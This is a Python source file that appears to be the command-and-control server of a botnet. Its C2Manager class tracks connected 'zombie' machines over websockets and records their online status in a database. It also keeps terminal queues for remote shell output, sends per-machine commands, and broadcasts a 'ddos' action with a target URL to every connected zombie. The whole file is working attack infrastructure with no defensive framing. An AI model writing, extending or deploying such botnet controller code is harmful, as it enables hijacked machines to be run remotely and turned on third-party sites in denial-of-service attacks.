import asyncio
from typing import Dict

from sqlalchemy import select
from starlette.websockets import WebSocket

from apps.zombie.models import Zombie
from config.database import async_session_maker


class C2Manager:
    def __init__(self):
        self.zombies: Dict[str, WebSocket] = {}
        self.terminal_queues: Dict[str, asyncio.Queue] = {}

    async def connect(self, zombie_id: str, websocket: WebSocket, ) -> None:
        await websocket.accept()
        self.zombies[zombie_id] = websocket

        try:
            async with async_session_maker() as session:
                query = select(Zombie).where(Zombie.id == int(zombie_id))
                result = await session.execute(query)
                zombie = result.scalar_one_or_none()
                if zombie:
                    zombie.status = "online"
                    await session.commit()
                await websocket.send_json({
                    "success": True,
                    "zombie_id": zombie_id,
                    "text": "Welcome to Zombie!"
                })
                print(f"[+] Zombie {zombie_id} is now online.")
        except Exception as e:
            print(e)

    async def disconnect(self, zombie_id: str) -> None:
        if zombie_id in self.zombies:
            del self.zombies[zombie_id]
        try:
            async with async_session_maker() as session:
                query = select(Zombie).where(Zombie.id == int(zombie_id))
                result = await session.execute(query)
                zombie = result.scalar_one_or_none()
                if zombie:
                    zombie.status = "offline"
                    await session.commit()
                await self.send_command(zombie_id, {'action': 'disconnect'})
                print(f"[-] Zombie {zombie_id} disconnected.")
        except Exception as e:
            print(f"[!] DB Error during disconnect for {zombie_id}: {e}")

    async def send_command(self, zombie_id: str, command: dict) -> bool:
        ws = self.zombies.get(zombie_id)
        if ws:
            try:
                action = command['action']
                if action != 'ddos':
                    await ws.send_json({
                        "action": command.get('action'),
                        "cmd": command.get("command_type"),
                        "command_id": command.get("command_id")
                    })
                    return True
                await ws.send_json({
                    "action": action,
                    "url": command.get("url"),
                })
                print({
                    "action": action,
                    "url": command.get("url"),
                })
                return True
            except Exception as e:
                print(f"[!] DB Error during send command for {zombie_id}: {e}")
                return False
        return False

    async def get_terminal_queue(self, zombie_id: str):
        if zombie_id not in self.terminal_queues:
            self.terminal_queues[zombie_id] = asyncio.Queue()
        return self.terminal_queues[zombie_id]

    async def broadcast(self, command: dict) -> None:
        for zid in self.zombies:
            await self.send_command(zid, command)


c2_manager = C2Manager()
